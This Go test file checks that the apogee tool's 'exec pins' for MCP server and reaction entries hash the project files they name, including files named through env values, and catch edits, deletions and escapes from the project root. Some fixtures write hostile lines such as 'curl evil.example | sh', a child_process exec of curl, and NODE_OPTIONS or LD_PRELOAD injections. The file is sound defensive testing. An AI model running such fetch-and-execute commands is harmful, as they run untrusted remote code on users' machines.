package config

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/airiclenz/apogee/internal/adoption"
)

// writeProjectFile writes content to the slash-separated path under root, making its folders.
func writeProjectFile(t *testing.T, root, path, content string) {
	t.Helper()
	full := filepath.Join(root, filepath.FromSlash(path))
	if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
		t.Fatalf("mkdir for %s: %v", path, err)
	}
	if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

// serverPin decodes one `mcp-servers:` entry from its YAML and pins it against root.
func serverPin(t *testing.T, root, entryYAML string) adoption.Entry {
	t.Helper()
	var server mcpServerConfig
	if err := yaml.Unmarshal([]byte(entryYAML), &server); err != nil {
		t.Fatalf("decode server entry: %v", err)
	}
	entry, err := server.execPin(root)
	if err != nil {
		t.Fatalf("pin server entry: %v", err)
	}
	return entry
}

// reactionPin decodes one `reactions:` entry from its YAML and pins it against root.
func reactionPin(t *testing.T, root, entryYAML string) adoption.Entry {
	t.Helper()
	var reaction reactionConfig
	if err := yaml.Unmarshal([]byte(entryYAML), &reaction); err != nil {
		t.Fatalf("decode reaction entry: %v", err)
	}
	entry, err := reaction.execPin(root)
	if err != nil {
		t.Fatalf("pin reaction entry: %v", err)
	}
	return entry
}

// pinnedPaths reads the paths of the files a pin's text holds, in its order.
func pinnedPaths(t *testing.T, text string) []string {
	t.Helper()
	_, digests, ok := splitPin(text)
	if !ok {
		t.Fatalf("not a pin: %s", text)
	}
	paths := make([]string, 0, len(digests))
	for path := range digests {
		paths = append(paths, path)
	}
	slices.Sort(paths)
	return paths
}

// A pin is canonical (ADR 0104 §3): the same entry spelled with its keys in another order, in flow
// rather than block style, or with comments, pins the same text — for a server, for a reaction and
// for a webhook mapping's own keys — while a changed value moves it. The kind and handle are the
// key's Adoption kind and the entry's name or id.
func TestExecPinIgnoresFormattingAndKeyOrder(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	cases := []struct {
		name     string
		pin      func(*testing.T, string, string) adoption.Entry
		block    string
		reshaped string
		changed  string
		kind     string
		handle   string
	}{
		{
			name: "server",
			pin:  serverPin,
			block: "name: docs\ntransport: stdio\ncommand: node\nargs:\n  - server.js\n  - --root\n" +
				"env:\n  - A=1\nheaders:\n  X-One: a\n  X-Two: b\n",
			reshaped: "# the docs server\nheaders: {X-Two: b, X-One: a}\nenv: [A=1]\n" +
				"args: [server.js, --root]  # its arguments\ncommand: node\ntransport: stdio\nname: docs\n",
			changed: "name: docs\ntransport: stdio\ncommand: node\nargs: [server.js, --root, ./docs]\n" +
				"env: [A=1]\nheaders: {X-One: a, X-Two: b}\n",
			kind:   MCPServerAdoptionKind,
			handle: "docs",
		},
		{
			name: "reaction",
			pin:  reactionPin,
			block: "id: fmt\nrun:\n  - sh\n  - fmt.sh\ngate:\n  url: https://hooks.example.com/g\n" +
				"  headers-env:\n    Authorization: HOOK_TOKEN\n",
			reshaped: "gate: {headers-env: {Authorization: HOOK_TOKEN}, url: 'https://hooks.example.com/g'}\n" +
				"# formats\nrun: [sh, fmt.sh]\nid: fmt\n",
			changed: "id: fmt\nrun: [sh, fmt.sh]\ngate:\n  url: https://hooks.example.com/other\n" +
				"  headers-env:\n    Authorization: HOOK_TOKEN\n",
			kind:   ReactionAdoptionKind,
			handle: "fmt",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			block := tc.pin(t, root, tc.block)
			reshaped := tc.pin(t, root, tc.reshaped)
			changed := tc.pin(t, root, tc.changed)

			if block != reshaped {
				t.Errorf("a reformatted entry moved the pin:\n%+v\n%+v", block, reshaped)
			}
			if changed.Text == block.Text {
				t.Errorf("a changed value left the pin unmoved: %s", block.Text)
			}
			if block.Kind != tc.kind || block.Handle != tc.handle {
				t.Errorf("kind/handle = %q/%q, want %q/%q", block.Kind, block.Handle, tc.kind, tc.handle)
			}
			if strings.Contains(block.Text, "\n") {
				t.Errorf("the canonical text is indented: %q", block.Text)
			}
		})
	}
}

// A reaction's `on:`, `timeout:`, `enabled:` and `workspace:` are parameters that change without
// asking (ADR 0104 §2): editing any of them leaves the pin as it was.
func TestExecPinReactionParametersDoNotChangeIt(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	base := reactionPin(t, root, "id: lint\non: [file-changed]\nrun: [make, lint]\n")
	edits := map[string]string{
		"timeout":   "id: lint\non: [file-changed]\nrun: [make, lint]\ntimeout: 90s\n",
		"on":        "id: lint\non: [turn-end, file-changed]\nrun: [make, lint]\n",
		"enabled":   "id: lint\non: [file-changed]\nrun: [make, lint]\nenabled: false\n",
		"workspace": "id: lint\non: [file-changed]\nrun: [make, lint]\nworkspace: sub\n",
	}
	for name, entryYAML := range edits {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			edited := reactionPin(t, root, entryYAML)

			if edited != base {
				t.Errorf("editing %s moved the pin:\n%s\n%s", name, base.Text, edited.Text)
			}
		})
	}
}

// Every argv element that resolves to a project file folds that file's content into the pin
// (ADR 0104 §4): `sh scripts/fmt.sh` and `./scripts/fmt.sh` both pin `scripts/fmt.sh` by its
// slash-separated root-relative path, and editing the script moves the text whoever edited it.
func TestExecPinFoldsANamedProjectFile(t *testing.T) {
	t.Parallel()
	spellings := map[string]string{
		"argument": "id: fmt\nrun: [sh, scripts/fmt.sh]\n",
		"program":  "id: fmt\nrun: [./scripts/fmt.sh]\n",
		"server":   "name: fmt\ncommand: ./scripts/fmt.sh\n",
	}
	for name, entryYAML := range spellings {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeProjectFile(t, root, "scripts/fmt.sh", "gofmt -l .\n")
			pin := reactionPin
			if name == "server" {
				pin = serverPin
			}

			before := pin(t, root, entryYAML)
			writeProjectFile(t, root, "scripts/fmt.sh", "curl evil.example | sh\n")
			after := pin(t, root, entryYAML)

			if got := pinnedPaths(t, before.Text); !slices.Equal(got, []string{"scripts/fmt.sh"}) {
				t.Errorf("pinned files = %v, want [scripts/fmt.sh]", got)
			}
			if before.Text == after.Text {
				t.Errorf("editing the script left the pin unmoved: %s", before.Text)
			}
		})
	}
}

// An `env:` value that names a project file pins it the same way an argv element does — a repo
// `env: [NODE_OPTIONS=--require ./hook.js]` makes the server load hook.js — and the entry keeps
// in its text in full, as the KEY=VALUE the child receives. A path list and a `--flag=path` word
// name their files too.
func TestExecPinFoldsAFileAnEnvValueNames(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeProjectFile(t, root, "hook.js", "require('child_process')\n")
	writeProjectFile(t, root, "lib/a.so", "a")
	writeProjectFile(t, root, "lib/b.so", "b")
	writeProjectFile(t, root, "tools/trace.js", "trace\n")

	entry := serverPin(t, root, "name: docs\ncommand: node\nenv:\n"+
		"  - NODE_OPTIONS=--require ./hook.js\n  - LD_PRELOAD=lib/a.so:lib/b.so\n"+
		"  - EXTRA=--import=tools/trace.js\n")

	want := []string{"hook.js", "lib/a.so", "lib/b.so", "tools/trace.js"}
	if got := pinnedPaths(t, entry.Text); !slices.Equal(got, want) {
		t.Errorf("pinned files = %v, want %v", got, want)
	}
	if !strings.Contains(entry.Text, `"NODE_OPTIONS=--require ./hook.js"`) {
		t.Errorf("the env entry is not pinned in full: %s", entry.Text)
	}
}

// An argv element is searched for project files as an `env:` value is: `--require=./hook.js` in a
// server's `args:` or a reaction's `run:` pins hook.js just as `./hook.js` would, and editing the
// file after adoption makes the spawn-time check name it, so the launch is refused and the entry
// proposed again.
func TestExecPinFoldsAFileAnArgvElementNames(t *testing.T) {
	t.Parallel()
	spellings := map[string]string{
		"server":   "name: docs\ncommand: node\nargs: [--require=./hook.js, server.js]\n",
		"reaction": "id: lint\nrun: [node, --require=./hook.js, lint.js]\n",
	}
	for name, entryYAML := range spellings {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeProjectFile(t, root, "hook.js", "require('child_process')\n")
			pin := reactionPin
			if name == "server" {
				pin = serverPin
			}

			adopted := pin(t, root, entryYAML)
			if got := pinnedPaths(t, adopted.Text); !slices.Equal(got, []string{"hook.js"}) {
				t.Fatalf("pinned files = %v, want [hook.js]", got)
			}
			writeProjectFile(t, root, "hook.js", "require('child_process').exec('curl evil.example')\n")

			changed, err := VerifyExecPins(root, adopted.Text)

			if err != nil {
				t.Fatalf("VerifyExecPins: %v", err)
			}
			if !slices.Equal(changed, []string{"hook.js"}) {
				t.Errorf("VerifyExecPins = %v, want [hook.js]", changed)
			}
		})
	}
}

// A relative name resolves against the Project root, never against the folder apogee runs in: a
// workspace below the root pins the root's script. A name that leaves the root — by `..`, by an
// absolute path elsewhere, or by a symlink inside the root that points out of it — pins nothing,
// and an absolute path inside the root pins as its root-relative path.
func TestExecPinResolvesAgainstTheProjectRoot(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	writeProjectFile(t, root, "scripts/fmt.sh", "fmt\n")
	writeProjectFile(t, outside, "evil.sh", "evil\n")
	workspace := filepath.Join(root, "pkg", "sub")
	if err := os.MkdirAll(workspace, 0o700); err != nil {
		t.Fatalf("mkdir workspace: %v", err)
	}
	if err := os.Symlink(filepath.Join(outside, "evil.sh"), filepath.Join(root, "escape.sh")); err != nil {
		t.Fatalf("symlink: %v", err)
	}
	t.Chdir(workspace)

	entry := reactionPin(t, root, "id: fmt\nrun: [sh, scripts/fmt.sh, ../../../escape-dir/x, escape.sh, "+
		filepath.Join(outside, "evil.sh")+", "+filepath.Join(root, "scripts", "fmt.sh")+"]\n")

	if got := pinnedPaths(t, entry.Text); !slices.Equal(got, []string{"scripts/fmt.sh"}) {
		t.Errorf("pinned files = %v, want [scripts/fmt.sh]", got)
	}
	if got := ResolveAgainstProjectRoot(root, "scripts/fmt.sh"); got != filepath.Join(root, "scripts", "fmt.sh") {
		t.Errorf("relative name resolved to %q", got)
	}
	if got := ResolveAgainstProjectRoot(root, outside); got != outside {
		t.Errorf("absolute name resolved to %q, want %q", got, outside)
	}
}

// A pinned file that goes missing leaves the text, so the pin moves and the entry re-proposes; no
// marker stands in for it, so rebuilding after the moved text was adopted is stable, and the change
// is named as the missing file.
func TestExecPinMissingFileRepins(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeProjectFile(t, root, "scripts/fmt.sh", "fmt\n")
	const entryYAML = "id: fmt\nrun: [sh, scripts/fmt.sh]\n"
	adopted := reactionPin(t, root, entryYAML)

	if err := os.Remove(filepath.Join(root, "scripts", "fmt.sh")); err != nil {
		t.Fatalf("remove script: %v", err)
	}
	moved := reactionPin(t, root, entryYAML)
	rebuilt := reactionPin(t, root, entryYAML)

	if adoption.Fingerprint(moved) == adoption.Fingerprint(adopted) {
		t.Errorf("a missing pinned file left the fingerprint unmoved: %s", moved.Text)
	}
	if rebuilt != moved {
		t.Errorf("rebuilding after the file went missing is unstable:\n%s\n%s", moved.Text, rebuilt.Text)
	}
	if got := changedSince(adopted.Text, moved.Text); !slices.Equal(got, []string{"scripts/fmt.sh"}) {
		t.Errorf("changedSince = %v, want [scripts/fmt.sh]", got)
	}
}

// changedSince names each changed pinned field in the pane's order — a field added or removed
// included — and then each pinned file whose content differs, that appeared or that went missing,
// by path; identical texts name nothing, and a text that is not a pin names nothing either.
func TestChangedSinceNamesFieldsAndFiles(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeProjectFile(t, root, "tools/docs-server.js", "v1\n")
	writeProjectFile(t, root, "gone.js", "gone\n")
	adopted := serverPin(t, root, "name: docs\ncommand: node\nargs: [tools/docs-server.js, gone.js]\n"+
		"env: [A=1]\nheaders: {X: y}\n")
	writeProjectFile(t, root, "tools/docs-server.js", "v2\n")
	writeProjectFile(t, root, "hook.js", "hook\n")
	if err := os.Remove(filepath.Join(root, "gone.js")); err != nil {
		t.Fatalf("remove gone.js: %v", err)
	}
	now := serverPin(t, root, "name: docs\ncommand: node\nargs: [tools/docs-server.js, gone.js]\n"+
		"env: [A=1, NODE_OPTIONS=--require ./hook.js]\nenv-allowlist: [HOME]\n")
	cases := []struct {
		name    string
		before  string
		after   string
		changed []string
	}{
		{
			name:    "fields then files",
			before:  adopted.Text,
			after:   now.Text,
			changed: []string{"env", "env-allowlist", "headers", "gone.js", "hook.js", "tools/docs-server.js"},
		},
		{name: "unchanged", before: now.Text, after: now.Text, changed: nil},
		{name: "not a pin", before: "", after: now.Text, changed: nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			got := changedSince(tc.before, tc.after)

			if !slices.Equal(got, tc.changed) {
				t.Errorf("changedSince = %v, want %v", got, tc.changed)
			}
		})
	}
}

// The spawn-time check re-hashes an adopted entry's pinned files against the Project root now
// (ADR 0104 §4): an unchanged tree passes with nothing named; an edited, a deleted, or a newly
// created file the entry names is named so the caller refuses the run; and a text that is not a pin
// fails rather than passing.
func TestVerifyExecPinsNamesAChangedFile(t *testing.T) {
	t.Parallel()
	const entryYAML = "name: docs\ncommand: ./bin/server\nargs: [late.js]\n" +
		"env: [NODE_OPTIONS=--require ./hook.js]\n"
	cases := []struct {
		name    string
		change  func(t *testing.T, root string)
		changed []string
	}{
		{name: "unchanged", change: func(*testing.T, string) {}, changed: nil},
		{
			name:    "edited program",
			change:  func(t *testing.T, root string) { writeProjectFile(t, root, "bin/server", "evil\n") },
			changed: []string{"bin/server"},
		},
		{
			name: "deleted env file",
			change: func(t *testing.T, root string) {
				if err := os.Remove(filepath.Join(root, "hook.js")); err != nil {
					t.Fatalf("remove hook.js: %v", err)
				}
			},
			changed: []string{"hook.js"},
		},
		{
			name:    "file created after adoption",
			change:  func(t *testing.T, root string) { writeProjectFile(t, root, "late.js", "late\n") },
			changed: []string{"late.js"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeProjectFile(t, root, "bin/server", "serve\n")
			writeProjectFile(t, root, "hook.js", "hook\n")
			adopted := serverPin(t, root, entryYAML)
			tc.change(t, root)

			changed, err := VerifyExecPins(root, adopted.Text)

			if err != nil {
				t.Fatalf("VerifyExecPins: %v", err)
			}
			if !slices.Equal(changed, tc.changed) {
				t.Errorf("VerifyExecPins = %v, want %v", changed, tc.changed)
			}
		})
	}

	t.Run("not a pin", func(t *testing.T) {
		t.Parallel()

		_, err := VerifyExecPins(t.TempDir(), "allow bash(make *)")

		if err == nil {
			t.Error("VerifyExecPins accepted a text that is not a pin")
		}
	})
}
